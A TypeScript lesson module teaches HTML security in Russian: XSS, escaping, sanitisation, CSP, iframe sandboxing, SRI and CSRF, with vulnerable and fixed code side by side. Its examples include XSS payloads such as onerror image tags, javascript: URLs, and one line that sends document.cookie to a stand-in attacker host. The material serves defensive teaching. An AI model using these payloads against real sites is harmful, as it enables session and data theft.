import type { Topic } from "../../types";
import {
  annotated,
  beforeAfter,
  code,
  def,
  diagram,
  exercise,
  h,
  insight,
  iq,
  mcq,
  note,
  ol,
  open,
  p,
  section,
  steps,
  table,
  tip,
  ul,
  warn,
  wrongRight,
} from "../../dsl";

export const htmlSecurity: Topic = {
  id: "html.html-security",
  slug: "html-security",
  domain: "html",
  module: "advanced",
  title: "Безопасность HTML: XSS, CSP, iframe, ссылки",
  titleEn: "HTML security: XSS and output encoding, CSP, sandbox, noopener, SRI, clickjacking, security headers",
  summary:
    "Разметка — это интерфейс между недоверенными данными и браузером, который исполняет всё, что считает кодом. Тема объясняет, как возникает XSS и как его предотвращать (экранирование, санитизация, Trusted Types), как работает Content Security Policy, и как защитить ссылки, фреймы, формы и сторонние ресурсы.",
  minutes: 65,
  prerequisites: ["html.parsing-dom", "html.embedded-content", "html.web-storage", "html.links"],
  tags: ["XSS", "CSP", "Content-Security-Policy", "innerHTML", "output encoding", "sanitization", "DOMPurify", "Trusted Types", "iframe sandbox", "noopener", "noreferrer", "SRI", "clickjacking", "frame-ancestors", "CSRF", "HSTS", "nosniff", "Referrer-Policy", "DOM clobbering"],
  keyConcepts: [
    { term: "XSS", text: "Межсайтовый скриптинг: недоверенные данные попадают в страницу как **код** и выполняются в контексте вашего сайта." },
    { term: "Экранирование по контексту", text: "Одни и те же данные кодируются по-разному в тексте, атрибуте, URL, JS и CSS. Правило: данные — это текст, пока вы явно не решили иначе." },
    { term: "Санитизация", text: "Если нужно сохранить часть разметки (комментарии, редактор), её очищают проверенной библиотекой по белому списку — не регулярными выражениями." },
    { term: "Эшелонированная защита", text: "CSP, Trusted Types, `HttpOnly`-cookie и безопасные заголовки ограничивают ущерб, если одна из защит дала сбой." },
    { term: "Недоверенное — всё внешнее", text: "Поля формы, параметры URL, заголовки, данные API, сторонние скрипты, файлы, `postMessage`, хранилище браузера." },
  ],
  sections: [
    section("definition", [
      def("XSS (Cross-Site Scripting)", "Класс уязвимостей, при которых злоумышленник заставляет сайт выдать страницу с чужим JavaScript. Скрипт выполняется с правами и в источнике (origin) вашего сайта: читает данные страницы, действует от имени пользователя, крадёт сессию. Виды: **хранимая** (stored), **отражённая** (reflected), **DOM-based**.", "cross-site scripting"),
      def("Content Security Policy (CSP)", "Политика безопасности контента, задаваемая заголовком `Content-Security-Policy`: список источников, из которых страница может загружать скрипты, стили, изображения, фреймы и т.д., и ограничения на встроенный код. Ограничивает ущерб от XSS и внедрения.", "Content Security Policy"),
      def("Недоверенные данные", "Любые данные, источник которых вы не контролируете: ввод пользователя, параметры адреса, данные из базы (если их туда мог записать пользователь), ответы сторонних API, содержимое файлов.", "untrusted data"),
    ]),

    section("why", [
      h("Браузер исполняет то, что ему дали"),
      p("Парсер HTML не различает «ваш» и «чужой» код. Если в страницу попала строка `<img src=x onerror=…>` — она станет живым элементом с рабочим обработчиком. XSS на одной странице позволяет злоумышленнику: украсть токены и данные, отправлять запросы от имени пользователя (перевод денег, смена пароля), подменить интерфейс (фишинг), установить кейлоггер."),
      h("Цена ошибок"),
      ul(
        "Утечка персональных данных и штрафы по законам о защите данных.",
        "Потеря доверия: пользователи уходят после инцидента.",
        "Ущерб от ботнетов и майнинга в браузерах посетителей.",
        "Уязвимость в **одной** форме комментариев ставит под удар весь сайт: скрипт выполняется в общем источнике.",
      ),
      h("Закономерность"),
      p("XSS остаётся в списках самых распространённых уязвимостей веба, хотя бороться с ним умеют. Причина проста: каждый вывод данных в разметку — потенциальная дыра, а разработчики забывают про один из контекстов. Поэтому защита строится **многоуровневой**: безопасные API по умолчанию, экранирование, санитизация, CSP, Trusted Types и мониторинг."),
      insight("Базовое правило: **данные — это текст, а не код**. Любая вставка в HTML — через `textContent`, шаблонизатор с автоматическим экранированием или проверенный санитайзер."),
    ]),

    section("mental-model", [
      p("Представьте типографию, где наборщик (парсер) воспринимает всё напечатанное как инструкции. Если вы вставите в макет чужой текст «и теперь печатай мои шрифты», он выполнит. Ваша задача — **закавычить** чужой текст, чтобы он остался цитатой (экранирование), либо **вычистить** опасные слова (санитизация), либо ограничить, чьи инструкции типография вообще принимает (CSP)."),
      diagram(
        `
        недоверенные данные ──► [контекст вывода] ──► браузер
              │                       │
              │             HTML-текст · атрибут · URL · JavaScript · CSS
              │                       │
              └── экранировать ◄──────┘   (разные правила для каждого контекста)

        уровни защиты:
          1. не вставлять как HTML           (textContent, автоэкранирование шаблонов)
          2. если нужна разметка             (санитайзер по белому списку)
          3. ограничить исполнение           (CSP, Trusted Types)
          4. ограничить ущерб                (HttpOnly, SameSite, sandbox, минимальные права)
        `,
        "Многоуровневая защита от XSS",
      ),
      table(
        ["Контекст вывода", "Опасные символы", "Как защищаться"],
        [
          ["Текст внутри элемента", "`<`, `&`", "Экранировать `&lt;` `&amp;`; в DOM — `textContent`"],
          ["Значение атрибута", "`\"`, `'`, `&`, `<`", "Экранировать и **всегда** брать значение в кавычки; в DOM — `setAttribute`"],
          ["URL (`href`, `src`)", "Схемы `javascript:`, `data:`", "Разрешить только `http:`, `https:`, `mailto:`, `tel:`; проверять через `new URL`"],
          ["JavaScript (внутри `<script>` или `on*`)", "Практически всё", "Не вставлять данные; передавать как JSON с экранированием `<` (`\\u003c`)"],
          ["CSS (`style`, `<style>`)", "`url()`, `expression`, `}`", "Не вставлять недоверенные данные; использовать значения из белого списка"],
        ],
        "Экранирование зависит от контекста",
      ),
    ]),

    section("technical", [
      h("Виды XSS"),
      table(
        ["Вид", "Откуда данные", "Пример"],
        [
          ["**Хранимая (stored)**", "Из базы (комментарий, профиль)", "Комментарий с `<img onerror>` показывается всем посетителям"],
          ["**Отражённая (reflected)**", "Из запроса (параметр URL)", "Ссылка `/search?q=<script>…` выводит `q` без экранирования"],
          ["**DOM-based**", "Клиентский код читает `location`, `postMessage`, `localStorage` и пишет в `innerHTML`", "`el.innerHTML = location.hash.slice(1)`"],
        ],
      ),
      h("Опасные места («sinks») в DOM"),
      ul(
        "**`innerHTML`, `outerHTML`, `insertAdjacentHTML`, `document.write`** — разбирают строку как HTML.",
        "**`eval`, `new Function`, `setTimeout(\"строка\")`, `script.text`** — исполняют строку как код.",
        "**`element.setAttribute(\"on…\", …)`**, `href=\"javascript:…\"`, `iframe srcdoc` с данными.",
        "**Фреймворки:** `dangerouslySetInnerHTML` (React), `v-html` (Vue), `[innerHTML]` (Angular), `{@html}` (Svelte) — «аварийные выходы» из экранирования.",
      ),
      code(
        "js",
        `
        const comment = '<img src=x onerror="stealCookies()">';

        el.innerHTML = comment;          // ОПАСНО: создаётся <img>, сработает onerror
        el.textContent = comment;        // БЕЗОПАСНО: отображается как текст

        // Безопасное создание элемента
        const a = document.createElement("a");
        a.textContent = userName;
        a.href = safeUrl(userUrl);       // проверка схемы!
        el.append(a);
        `,
        { filename: "xss-sinks.js" },
      ),
      h("Экранирование"),
      code(
        "js",
        `
        function escapeHtml(s) {
          return String(s)
            .replaceAll("&", "&amp;")
            .replaceAll("<", "&lt;")
            .replaceAll(">", "&gt;")
            .replaceAll('"', "&quot;")
            .replaceAll("'", "&#39;");
        }

        // Проверка URL по белому списку схем
        function safeUrl(input, base = "https://example.com") {
          try {
            const u = new URL(input, base);
            return ["http:", "https:", "mailto:", "tel:"].includes(u.protocol) ? u.href : "#";
          } catch {
            return "#";
          }
        }
        `,
        { filename: "escape.js" },
      ),
      ul(
        "Шаблонизаторы с автоэкранированием (Jinja2, Twig, Handlebars `{{ }}`, JSX, Vue-шаблоны) делают это по умолчанию — **не отключайте** без причины.",
        "Экранируйте **при выводе**, а не при сохранении: данные в базе остаются «сырыми», а способ вывода зависит от контекста.",
        "**Атрибуты — только в кавычках.** Без них пробел и `onmouseover=` начинают новый атрибут.",
        "Для URL разрешайте схемы по **белому списку**; чёрный список (`javascript:`) обходится (`JaVaScRiPt:`, пробелы, перевод строки).",
        "Не пытайтесь «чистить» HTML регулярными выражениями: парсер HTML снисходителен, обход практически всегда находится.",
      ),
      h("Санитизация, когда нужна разметка"),
      p("Редакторы, комментарии с форматированием, письма требуют сохранить **часть** HTML. Тогда применяют **санитайзер** — библиотеку, которая разбирает разметку парсером браузера и оставляет только разрешённые теги и атрибуты."),
      code(
        "js",
        `
        import DOMPurify from "dompurify";

        const clean = DOMPurify.sanitize(dirtyHtml, {
          ALLOWED_TAGS: ["p", "b", "i", "em", "strong", "a", "ul", "ol", "li", "blockquote", "code", "pre"],
          ALLOWED_ATTR: ["href", "title"],
        });

        // Все ссылки — безопасные и с rel
        DOMPurify.addHook("afterSanitizeAttributes", (node) => {
          if (node.tagName === "A") {
            node.setAttribute("rel", "ugc nofollow noopener noreferrer");
            node.setAttribute("target", "_blank");
          }
        });
        `,
        { filename: "sanitize.js" },
      ),
      ul(
        "**Белый список** тегов и атрибутов; минимальный набор.",
        "**Санитизируйте на стороне вывода** (или при сохранении — но тогда версия библиотеки должна обновляться, а старые данные пересчитываться).",
        "**Mutation XSS (mXSS):** хитрые конструкции, которые меняются при повторном разборе браузером и «оживают» после санитизации. Поэтому используйте проверенные библиотеки с регулярными обновлениями и не меняйте результат санитайзера (`innerHTML` повторно).",
        "**Платформенные средства:** Sanitizer API (`Element.setHTML()`) стандартизируется; поддержка пока неполная — следите за таблицами совместимости.",
      ),
      h("Content Security Policy"),
      code(
        "text",
        `
        Content-Security-Policy:
          default-src 'self';
          script-src 'self' 'nonce-r4nd0m' 'strict-dynamic';
          style-src 'self' 'nonce-r4nd0m';
          img-src 'self' data: https://cdn.example.com;
          font-src 'self' https://fonts.gstatic.com;
          connect-src 'self' https://api.example.com;
          object-src 'none';
          base-uri 'none';
          frame-ancestors 'none';
          form-action 'self';
          upgrade-insecure-requests
        `,
        { filename: "csp-header.txt", caption: "Пример строгой CSP. `nonce` генерируется сервером заново для каждого ответа." },
      ),
      table(
        ["Директива", "Что ограничивает"],
        [
          ["`default-src`", "Источники по умолчанию для всех типов ресурсов"],
          ["`script-src`, `style-src`", "Откуда можно загружать/выполнять скрипты и стили; ограничения на inline"],
          ["`img-src`, `font-src`, `media-src`, `connect-src`", "Изображения, шрифты, медиа, `fetch`/XHR/WebSocket"],
          ["`frame-src` / `child-src`", "Что можно встраивать в `iframe`"],
          ["`frame-ancestors`", "**Кто** может встраивать вашу страницу (защита от clickjacking; заменяет `X-Frame-Options`)"],
          ["`object-src 'none'`", "Запрет `<object>`, `<embed>`, `<applet>`"],
          ["`base-uri`", "Допустимые значения `<base href>` (защита от подмены базы)"],
          ["`form-action`", "Куда формы могут отправлять данные"],
          ["`upgrade-insecure-requests`", "Автоматически переводит `http` в `https`"],
          ["`require-trusted-types-for 'script'`", "Требует Trusted Types для опасных приёмников (в поддерживающих браузерах)"],
        ],
      ),
      ul(
        "**Избегайте `'unsafe-inline'` и `'unsafe-eval'`:** они сводят защиту скриптов на нет. Вместо этого — **nonce** (случайное одноразовое значение в заголовке и в атрибуте `nonce` скрипта) или **хэши** встроенных блоков.",
        "**`'strict-dynamic'`** позволяет доверенным скриптам подгружать другие скрипты без перечисления доменов (современный подход вместо белых списков доменов).",
        "**Режим наблюдения:** `Content-Security-Policy-Report-Only` + `report-to` помогает безопасно ввести политику: собирайте нарушения, исправляйте, затем включайте блокировку.",
        "**`<meta http-equiv=\"Content-Security-Policy\">`** поддерживает не все директивы (нет `frame-ancestors`, `report-uri`, `sandbox`) и действует только после его разбора; предпочитайте HTTP-заголовок.",
        "**CSP — не замена экранированию,** а второй рубеж: он ограничивает ущерб, но не исправляет уязвимость.",
      ),
      h("Trusted Types"),
      p("Механизм (в браузерах на основе Chromium и ряде других) запрещает присваивать **обычные строки** опасным приёмникам (`innerHTML`, `eval`, `script.src`): допускаются только объекты «доверенных типов», создаваемые именованными политиками. Включается директивой `require-trusted-types-for 'script'`. Он превращает скрытые по всему коду точки риска в несколько проверяемых политик."),
      h("Ссылки: `target=\"_blank\"`, `noopener`, `noreferrer`"),
      table(
        ["Атрибут `rel`", "Что делает"],
        [
          ["`noopener`", "Новая вкладка не получает `window.opener`: нельзя подменить страницу-источник (**reverse tabnabbing**)"],
          ["`noreferrer`", "Не отправлять заголовок `Referer` (и подразумевает `noopener`)"],
          ["`nofollow`, `ugc`, `sponsored`", "Подсказки поисковикам о природе ссылки (не про безопасность)"],
        ],
      ),
      ul(
        "В современных браузерах `target=\"_blank\"` по умолчанию работает как `noopener`, но явный `rel=\"noopener\"` остаётся хорошей практикой для старых клиентов.",
        "Для ссылок на пользовательские сайты — `rel=\"ugc nofollow noopener noreferrer\"`.",
        "Утечка через `Referer`: полный адрес страницы (с токенами в параметрах) уходит на сторонний сайт. Настройте `Referrer-Policy: strict-origin-when-cross-origin` (или строже) и не размещайте секреты в URL.",
      ),
      h("`iframe`: sandbox, allow, ограничения"),
      code(
        "html",
        `
        <iframe
          src="https://widgets.example.org/map"
          title="Карта офисов"
          sandbox="allow-scripts allow-popups"
          referrerpolicy="no-referrer"
          allow="geolocation 'none'; camera 'none'"
          loading="lazy"></iframe>
        `,
        { filename: "iframe-secure.html" },
      ),
      ul(
        "**`sandbox` без значений** — максимальные ограничения: нет скриптов, форм, всплывающих окон, доступа к источнику. Выдавайте только нужное: `allow-scripts`, `allow-forms`, `allow-popups`, `allow-modals`.",
        "**Опасная комбинация:** `allow-scripts` + `allow-same-origin` для **контента из того же источника** позволяет фрейму снять свой `sandbox` — не комбинируйте их для недоверенного кода.",
        "**`allow`** (Permissions Policy для фрейма) ограничивает доступ к камере, микрофону, геолокации и др.; **`referrerpolicy`** — утечку `Referer`.",
        "**Недоверенный пользовательский HTML** показывайте только в `sandbox`-фрейме или на **отдельном домене**, чтобы он не делил источник с основным сайтом.",
      ),
      h("Clickjacking"),
      p("Атакующий встраивает вашу страницу в невидимый `iframe` и обманом заставляет пользователя нажимать кнопки. Защита: **`Content-Security-Policy: frame-ancestors 'none'`** (или `'self'`/список доменов). Устаревший заголовок `X-Frame-Options: DENY|SAMEORIGIN` оставляют для старых клиентов."),
      h("Целостность внешних ресурсов: SRI"),
      code(
        "html",
        `
        <script src="https://cdn.example.org/lib@1.2.3/lib.min.js"
                integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
                crossorigin="anonymous"></script>
        `,
        { caption: "Subresource Integrity: браузер сверит хэш и не выполнит изменённый файл." },
      ),
      ul(
        "`integrity` = алгоритм + хэш (`sha256`/`sha384`/`sha512`); работает для `script` и `link rel=stylesheet`; нужен CORS (`crossorigin`).",
        "Защищает от подмены файла на CDN, но **не** от вредоносной зависимости, которую вы выбрали сами; фиксируйте точные версии.",
        "Минимизируйте сторонние скрипты и по возможности размещайте их у себя (self-hosting) с контролем обновлений.",
      ),
      h("Формы и CSRF"),
      ul(
        "**CSRF:** чужой сайт заставляет браузер отправить запрос с вашими cookie. Защита: `SameSite=Lax/Strict` у cookie сессии, **CSRF-токены** в формах, проверка `Origin`/`Referer`, подтверждение опасных действий.",
        "**Изменяющие запросы — только `POST`/`PUT`/`DELETE`,** не `GET`.",
        "**`form-action`** в CSP ограничивает адреса отправки; **`autocomplete`** и `type=\"password\"` для паролей; валидация на сервере.",
        "**Открытые перенаправления:** `?next=https://evil.example` без проверки приводят к фишингу — проверяйте адрес по белому списку.",
      ),
      h("Загрузка файлов и SVG"),
      ul(
        "Проверяйте тип по **содержимому**, а не по расширению и `Content-Type` клиента; ограничивайте размер.",
        "**SVG может содержать скрипты.** Не вставляйте пользовательские SVG в страницу как разметку; отдавайте их как изображения (`<img>`) с корректным `Content-Type` и CSP или с отдельного домена.",
        "Пользовательские файлы отдавайте с `Content-Disposition: attachment` или с отдельного домена, с заголовком `X-Content-Type-Options: nosniff`.",
      ),
      h("DOM clobbering"),
      p("Элементы с `id` и `name` создают глобальные переменные и свойства `document`: `<img name=\"cookie\">` может перекрыть `document.cookie` при чтении, `<a id=\"config\">` — `window.config`. Если пользователь может влиять на `id`/`name`, код вида `if (window.config)` оказывается уязвим. Не опирайтесь на глобальные имена, проверяйте типы значений, санитизируйте `id`/`name` в пользовательской разметке."),
      h("Заголовки безопасности"),
      table(
        ["Заголовок", "Назначение"],
        [
          ["`Content-Security-Policy`", "Ограничение источников и исполняемого кода; `frame-ancestors`"],
          ["`Strict-Transport-Security`", "HSTS: только HTTPS (`max-age=31536000; includeSubDomains`)"],
          ["`X-Content-Type-Options: nosniff`", "Запрет угадывания MIME-типа"],
          ["`Referrer-Policy`", "Что отправлять в `Referer` (`strict-origin-when-cross-origin`, `no-referrer`)"],
          ["`Permissions-Policy`", "Отключение функций браузера (камера, геолокация…) для страницы и фреймов"],
          ["`Cross-Origin-Opener-Policy` / `Cross-Origin-Resource-Policy`", "Изоляция окон и ресурсов (защита от атак по побочным каналам и утечек)"],
          ["`Set-Cookie: HttpOnly; Secure; SameSite`", "Безопасные cookie сессии"],
        ],
      ),
      note("HTTPS обязателен: на `http` любой посредник может подменить страницу и внедрить скрипт. Следите за **смешанным контентом** (`http`-ресурсы на `https`-странице) и включайте HSTS."),
    ]),

    section("syntax", [
      code(
        "html",
        `
        <!-- Безопасные ссылки -->
        <a href="https://partner.example/offer" target="_blank" rel="noopener noreferrer">Партнёр</a>
        <a href="https://user-site.example" target="_blank" rel="ugc nofollow noopener noreferrer">Сайт автора</a>

        <!-- Внешний скрипт с SRI -->
        <script src="https://cdn.example.org/lib@1.2.3/lib.min.js"
                integrity="sha384-…" crossorigin="anonymous" defer></script>

        <!-- Встроенный скрипт, разрешённый CSP через nonce (генерируется сервером на каждый запрос) -->
        <script nonce="r4nd0m">window.__CONFIG__ = { api: "/api" };</script>

        <!-- Изолированный фрейм -->
        <iframe src="https://widgets.example.org/map" title="Карта" sandbox="allow-scripts"
                referrerpolicy="no-referrer" loading="lazy"></iframe>

        <!-- Форма с CSRF-токеном -->
        <form action="/profile" method="post">
          <input type="hidden" name="csrf" value="токен, привязанный к сессии">
          <button type="submit">Сохранить</button>
        </form>
        `,
        { lineNumbers: true, filename: "secure-html.html" },
      ),
    ]),

    section("minimal-example", [
      code(
        "html",
        `
        <div id="unsafe"></div>
        <div id="safe"></div>
        <p id="links"></p>

        <script>
          const comment = '<img src=x onerror="console.log(\\'⚠ чужой код выполнился (XSS)\\')">Привет!';

          // 1. Небезопасно: строка разбирается как HTML
          document.getElementById("unsafe").innerHTML = comment;

          // 2. Безопасно: текст остаётся текстом
          document.getElementById("safe").textContent = comment;
          console.log("textContent показывает как текст:", document.getElementById("safe").textContent.length, "символов");

          // 3. Экранирование для вставки в HTML-строку
          function escapeHtml(s) {
            return String(s).replaceAll("&", "&amp;").replaceAll("<", "&lt;").replaceAll(">", "&gt;").replaceAll('"', "&quot;").replaceAll("'", "&#39;");
          }
          console.log("escapeHtml:", escapeHtml(comment));

          // 4. Белый список схем для URL
          function safeUrl(input) {
            try {
              const u = new URL(input, "https://example.com");
              return ["http:", "https:", "mailto:", "tel:"].includes(u.protocol) ? u.href : "#";
            } catch { return "#"; }
          }
          for (const test of ["https://example.org/a", "javascript:alert(1)", "JaVaScRiPt:alert(1)", " javascript:alert(1)", "data:text/html,<b>x</b>", "/relative"]) {
            console.log(JSON.stringify(test), "→", safeUrl(test));
          }
        </script>
        `,
        { runnable: true },
      ),
      p("Первая вставка через `innerHTML` создаёт настоящий `<img>`, и его `onerror` срабатывает — в консоли появляется сообщение «чужой код выполнился». `textContent` показывает ту же строку как текст. Функция `safeUrl` разбирает адрес парсером URL и сверяет схему со **списком разрешённых**: варианты с разным регистром и пробелами не обходят проверку."),
    ]),

    section("detailed-example", [
      p("Виджет комментариев. Сначала уязвимая версия: комментарий сохраняется «как есть» и выводится через `innerHTML`, ссылка на сайт автора подставляется без проверки. Затем исправленная: текст — через `textContent`, ссылка — через проверку схемы и `rel`, форматирование — через санитайзер с белым списком."),
      code(
        "js",
        `
        // ❌ УЯЗВИМО
        function renderComment(c) {
          list.insertAdjacentHTML("beforeend",
            '<li><b>' + c.author + '</b>: ' + c.text +
            ' <a href="' + c.website + '" target="_blank">сайт</a></li>');
        }
        // c.author  = '<img src=x onerror=stealToken()>'
        // c.website = 'javascript:fetch("//evil.example?c="+document.cookie)'
        `,
        { filename: "comments-bad.js" },
      ),
      code(
        "js",
        `
        // ✅ БЕЗОПАСНО
        function renderComment(c) {
          const li = document.createElement("li");

          const author = document.createElement("b");
          author.textContent = c.author;                           // текст

          const body = document.createElement("span");
          body.innerHTML = DOMPurify.sanitize(c.html, {            // форматирование — только из белого списка
            ALLOWED_TAGS: ["p", "b", "i", "em", "strong", "code", "a", "ul", "ol", "li"],
            ALLOWED_ATTR: ["href"],
          });

          li.append(author, ": ", body);

          const url = safeUrl(c.website);
          if (url !== "#") {
            const a = document.createElement("a");
            a.href = url;
            a.textContent = "сайт";
            a.target = "_blank";
            a.rel = "ugc nofollow noopener noreferrer";
            li.append(" ", a);
          }
          list.append(li);
        }
        `,
        { lineNumbers: true, filename: "comments-good.js", collapsed: true },
      ),
      ul(
        "**Автор** выводится как текст: любые `<`, кавычки и разметка остаются строкой.",
        "**Тело комментария** с форматированием очищается санитайзером по белому списку; библиотека парсит HTML так же, как браузер.",
        "**Ссылка** проходит проверку схемы и получает `rel=\"ugc nofollow noopener noreferrer\"`.",
        "**Защита второго рубежа:** CSP без `unsafe-inline`, `HttpOnly`-cookie сессии, Trusted Types.",
      ),
    ]),

    section("analysis", [
      annotated(
        "html",
        `
        <a href="https://x.example" target="_blank" rel="noopener noreferrer">Сайт</a>
        <script src="https://cdn.example.org/lib.js" integrity="sha384-…" crossorigin="anonymous"></script>
        <script nonce="r4nd0m">init()</script>
        <iframe src="https://w.example.org" sandbox="allow-scripts" referrerpolicy="no-referrer"></iframe>
        <form method="post"><input type="hidden" name="csrf" value="…"></form>
        `,
        [
          { line: 1, text: "`noopener` не даёт новой вкладке управлять исходной через `window.opener` (reverse tabnabbing); `noreferrer` дополнительно скрывает адрес страницы-источника." },
          { line: 2, text: "SRI: браузер сравнит хэш загруженного файла с `integrity` и откажется выполнять изменённый скрипт. Для проверки нужен `crossorigin` (CORS)." },
          { line: 3, text: "`nonce` разрешает конкретный встроенный скрипт при строгой CSP (`script-src 'nonce-r4nd0m'`). Значение случайное и **новое для каждого ответа**; повторно используемый nonce бесполезен." },
          { line: 4, text: "`sandbox` отключает всё, кроме выданного (`allow-scripts`); без `allow-same-origin` фрейм получает «непрозрачный» источник и не может читать ваши cookie и хранилище." },
          { line: 5, text: "CSRF-токен привязан к сессии пользователя; сервер отклонит запрос без верного токена. В дополнение — `SameSite` у cookie." },
        ],
        "security-annotated.html",
      ),
    ]),

    section("internals", [
      steps(
        [
          ["Данные доходят до приёмника", "Недоверенная строка попадает в «sink»: шаблон, `innerHTML`, атрибут, URL. Если экранирования нет, парсер HTML воспринимает символы `<` и `>` как начало тегов."],
          ["Парсер строит DOM", "Парсер HTML создаёт элементы и атрибуты, включая **обработчики событий** (`onerror`) и **скрипты**. Скрипты, вставленные через `innerHTML`, не выполняются, но обработчики и `javascript:`-ссылки — выполняются."],
          ["Проверка CSP", "Перед загрузкой каждого ресурса и исполнением встроенного кода браузер сверяется с политикой: источник разрешён? есть `nonce`/хэш? Нарушение блокируется и (при настройке) отправляется отчёт."],
          ["Trusted Types", "При включённой политике присваивание обычной строки опасному приёмнику вызывает ошибку; код должен пропустить значение через зарегистрированную политику, которая санитизирует или проверяет его."],
          ["Изоляция источников", "Same-Origin Policy запрещает странице читать данные другого источника; cookie `HttpOnly` скрыты от скриптов; `sandbox` и `Permissions-Policy` уменьшают привилегии фреймов."],
          ["Запросы и cookie", "Браузер автоматически прикладывает cookie к запросам; `SameSite` решает, делать ли это для межсайтовых запросов, а CSRF-токен подтверждает намерение пользователя."],
        ],
        "Путь недоверенных данных и уровни защиты",
      ),
      note("XSS выполняется в **источнике** вашего сайта: SOP его не остановит. Поэтому защита сосредоточена на том, чтобы чужой код вообще не выполнился, а если выполнился — получил как можно меньше возможностей."),
    ]),

    section("mistakes", [
      h("Ошибка 1. `innerHTML` для пользовательских данных"),
      wrongRight(
        "js",
        {
          code: `
            profile.innerHTML = "<h2>" + user.name + "</h2>";
          `,
          note: "Имя `<img src=x onerror=…>` превращается в рабочий код.",
        },
        {
          code: `
            const h2 = document.createElement("h2");
            h2.textContent = user.name;
            profile.replaceChildren(h2);
          `,
          note: "Данные остаются текстом.",
        },
      ),
      h("Ошибка 2. Недоверенный URL в `href`/`src`"),
      wrongRight(
        "html",
        {
          code: `
            <a href="{{ user.website }}">Сайт</a>
          `,
          note: "Значение `javascript:…` выполнится по клику; экранирование кавычек его не останавливает.",
        },
        {
          code: `
            <a href="{{ safeUrl(user.website) }}" rel="ugc nofollow noopener noreferrer">Сайт</a>
          `,
          note: "Проверка схемы по белому списку и безопасный `rel`.",
        },
      ),
      h("Ошибка 3. «Санитизация» регулярными выражениями"),
      p("Удаление `<script>` регулярным выражением обходится десятками способов (`<img onerror>`, вложенные теги, кодировки, `<svg onload>`, регистр). Используйте парсер и белые списки."),
      h("Ошибка 4. Экранирование при сохранении"),
      p("Если данные экранированы при записи, при выводе в другой контекст (JSON, письмо, атрибут) получится двойное экранирование или дыра. Храните сырые данные, экранируйте при выводе по контексту."),
      h("Ошибка 5. `unsafe-inline` в CSP «чтобы всё работало»"),
      p("Политика с `'unsafe-inline'` в `script-src` не защищает от внедрения inline-скриптов. Переходите на `nonce`/хэши и `strict-dynamic`; вводите политику через Report-Only."),
      h("Ошибка 6. Секреты на клиенте"),
      p("Токены в `localStorage`, ключи API в `data-*`, пароли в скрытых полях — всё читается XSS и любым пользователем. Сессия — в `HttpOnly`-cookie, секреты — на сервере."),
      h("Ошибка 7. Недоверенный HTML без изоляции"),
      p("Пользовательские страницы и письма показывают в том же источнике. Выносите на отдельный домен или в `sandbox`-`iframe` без `allow-same-origin`."),
      h("Ошибка 8. Бездумное доверие сторонним скриптам"),
      p("Чаты, виджеты, теги аналитики выполняются с полными правами вашего сайта. Любой компромисс на их стороне — ваш инцидент. Минимизируйте, изолируйте, добавляйте SRI, ограничивайте CSP."),
    ]),

    section("antipatterns", [
      ul(
        "**Безопасность «в последний момент»:** без модели угроз и тестов.",
        "**Отключение автоэкранирования** (`|safe`, `{!! !!}`, `dangerouslySetInnerHTML`) для удобства.",
        "**Доверие данным из собственной базы** — их мог записать пользователь.",
        "**Самодельные санитайзеры и экранирование** вместо проверенных библиотек.",
        "**CSP, скопированная из интернета,** без понимания: ломает сайт или ничего не защищает.",
        "**Исключения в CSP для «целых CDN»** (`script-src https://cdn.example.org`): любой хост CDN может отдать вредоносный JS (JSONP, устаревшие библиотеки).",
        "**Безопасность через сокрытие:** «скрытое» поле, «невидимая» кнопка, обфускация.",
        "**Игнорирование обновлений** зависимостей и браузерных API безопасности.",
      ),
    ]),

    section("best-practices", [
      ul(
        "**Данные — текст:** `textContent`, `setAttribute`, шаблоны с автоэкранированием; `innerHTML` — только с санитизацией.",
        "**Экранирование по контексту при выводе;** URL — по белому списку схем.",
        "**Санитайзер (DOMPurify или встроенный) с белым списком** для пользовательской разметки; обновляйте библиотеку.",
        "**Строгая CSP** (nonce/хэши, `strict-dynamic`, `object-src 'none'`, `base-uri 'none'`, `frame-ancestors`); внедрение через Report-Only.",
        "**Trusted Types** там, где поддерживаются; запрет `eval`.",
        "**Cookie сессии:** `HttpOnly; Secure; SameSite=Lax`; CSRF-токены для изменяющих запросов.",
        "**Ссылки:** `rel=\"noopener noreferrer\"` для внешних, `ugc nofollow` для пользовательских; `Referrer-Policy`.",
        "**Фреймы:** `sandbox`, `allow`, `referrerpolicy`; недоверенное — на отдельном домене; `frame-ancestors` против clickjacking.",
        "**Сторонние ресурсы:** SRI, фиксированные версии, минимум зависимостей, ревизия.",
        "**HTTPS + HSTS, `nosniff`, `Permissions-Policy`;** проверка заголовков сканерами.",
        "**Процесс:** моделирование угроз, ревью кода, SAST/DAST, тесты с корпусом XSS-нагрузок, мониторинг CSP-отчётов, политика раскрытия уязвимостей.",
      ),
    ]),

    section("edge-cases", [
      h("Шаблонные строки и фреймворки"),
      p("Фреймворки экранируют текст автоматически, но не защищают атрибуты вроде `href`/`src`/`style` и «аварийные выходы» (`dangerouslySetInnerHTML`, `v-html`). Проверяйте URL, передавайте данные как значения, а не как строки разметки."),
      h("JSON внутри HTML"),
      p("Встраивая JSON в `<script>` (состояние приложения, JSON-LD), экранируйте `<` как `\\u003c` и `\\u2028/\\u2029`: иначе `</script>` в данных закроет тег. Предпочитайте отдельный запрос или `<script type=\"application/json\">` с экранированием."),
      h("Нестандартные контексты"),
      p("Внутри `<style>`, `<textarea>`, `<title>`, комментариев HTML, SVG и MathML действуют **особые правила парсинга**: то, что безопасно в одном контексте, опасно в другом. Не придумывайте свои фильтры — используйте проверенные библиотеки."),
      h("`target=\"_blank\"` и `window.open`"),
      p("`window.open(url, \"_blank\")` из скрипта также передаёт `opener`; используйте `noopener` в третьем аргументе (`window.open(url, \"_blank\", \"noopener,noreferrer\")`)."),
      h("`postMessage`"),
      p("Проверяйте `event.origin` и структуру сообщения; указывайте точный `targetOrigin` вместо `\"*\"`. Принятое сообщение — недоверенные данные."),
      h("Расширения и инструменты"),
      p("Расширения браузера и внедряемые рекламные скрипты могут менять DOM; не полагайтесь на «чистоту» страницы для проверок безопасности — проверка прав всегда на сервере."),
      h("CSP и сторонний код"),
      p("Строгая CSP может сломать виджеты, использующие `eval` или inline-обработчики. Планируйте миграцию: инвентаризация, замена или изоляция в `iframe`, Report-Only на этапе внедрения."),
      h("Уязвимости логики"),
      p("XSS — не единственный риск: IDOR (доступ к чужим объектам по ID), избыточные права, утечки через сообщения об ошибках, небезопасное хранение. HTML-безопасность — часть общей безопасности приложения (OWASP Top 10)."),
